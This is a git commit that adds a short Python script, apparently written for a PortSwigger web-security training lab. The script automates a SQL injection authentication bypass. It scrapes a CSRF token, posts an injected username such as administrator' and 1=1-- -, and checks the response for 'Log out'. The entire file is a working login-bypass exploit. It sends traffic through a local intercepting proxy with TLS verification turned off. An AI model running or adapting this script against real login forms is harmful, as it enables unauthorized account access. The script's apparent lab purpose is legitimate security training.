aecc9687eba64530906c85eadfeeea51b15c4e44
Jarrod Rizor <me@jarrodrizor.com>
2023-08-21 19:47:34 -0400

    Create sqli_lab2.py
    Second Python Script for Auth Bypass Port Swigger Lab

---
+++ sqli_lab2.py
@@ -0,0 +1,42 @@
+import requests
+import sys
+import urllib3
+from bs4 import BeautifulSoup
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+proxies = {'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}
+
+def get_csrf_token(s, url):
+    req = s.get(url, verify=False, proxies=proxies)
+    soup = BeautifulSoup(req.text, 'html.parser')
+    return soup.find("input")['value']
+
+def exploit_sqli(s, url, payload):
+    csrf = get_csrf_token(s, url)
+    data = {
+            "csrf":csrf, 
+            "username": payload, 
+            "password": "pass"
+        }
+    req = s.post(url, data=data, verify=False, proxies=proxies)
+    res = req.text
+    if "Log out" in res:
+        return True
+    else:
+        return False
+
+if __name__ == "__main__":
+    try:
+        url = sys.argv[1].strip()
+        payload = sys.argv[2].strip()
+    except IndexError:
+        print("[-] Usage: %s <url> <payload>" % sys.argv[0])
+        print("[-] Example: %s www.example.com administrator' and 1=1-- -" % sys.argv[0])
+        sys.exit(1)
+
+    s = requests.Session()
+
+    if exploit_sqli(s, url, payload):
+        print("[+] SQL Injection Successful!")
+    else:
+        print("[-] SQL Injection Failed!")
